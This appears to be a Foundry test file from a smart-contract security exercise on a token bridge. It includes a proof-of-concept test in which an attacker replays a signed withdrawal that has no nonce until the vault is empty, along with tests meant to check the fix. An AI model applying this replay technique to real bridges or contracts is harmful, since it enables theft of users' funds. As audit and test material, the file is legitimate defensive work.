// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract L1BossBridgeTest is Test {
    //////////////////
    //    USERS    //
    ////////////////

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");
    Account operator = makeAccount("operator");

    /////////////////
    // CONSTANTS   //
    ////////////////

    /////////////////
    // CONTRACTS  //
    ///////////////

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    /////////////////
    // DEPLOYS   ///
    ///////////////

    function setUp() external {
        vm.startPrank(deployer);
        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);
        token.transfer(address(attacker), 1e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    ////////////////////////
    // SUPPORT FUNCTIONS  //
    ////////////////////////

    function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

    ////////////////////
    //    TESTS     ///
    //////////////////

    modifier addFunds() {
        // We set an initial balance using the user already defined:
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);

        vm.stopPrank();

        _;
    }

    function test_attackwithdrawTokensToL1() external addFunds {
        // 1. We have an attacker account with 1 token:
        assertEq(token.balanceOf(attacker), 1e18);

        // 2. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 3. As the signature is not nonce protected, we can execute as much as we want:
        uint256 vaultBalance = token.balanceOf(address(vault)) / 1e18;

        for (uint256 i; i < vaultBalance; ++i) {
            tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);
        }
        vm.stopPrank();

        // 4. Check:
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker) / 1e18, vaultBalance);
    }

    /////////////////////////////
    //   TEST AFTER SOLUTION ////
    ////////////////////////////

    function test_attackTryAndFail() external addFunds {
        // 1. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 2. Attacker try and fail!!!!
        uint256 vaultBalance = token.balanceOf(address(vault)) / 1e18;

        for (uint256 i; i < vaultBalance; ++i) {
            tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);
        }
        vm.stopPrank();
    }

    function test_attackerWithdrawAndRun() external addFunds {
        // 2. We have an attacker account with 1 token:
        assertEq(token.balanceOf(attacker), 1e18);

        // 3. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 4. The signature IS PROTECTED. The attacker decided withdraw their own funds and run:
        uint256 vaultBalance = token.balanceOf(address(vault));

        tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);

        vm.stopPrank();

        // 5. Check:
        assertEq(token.balanceOf(address(vault)), vaultBalance - attackerDepositAmount);
        assertEq(token.balanceOf(attacker), attackerDepositAmount);
    }
}
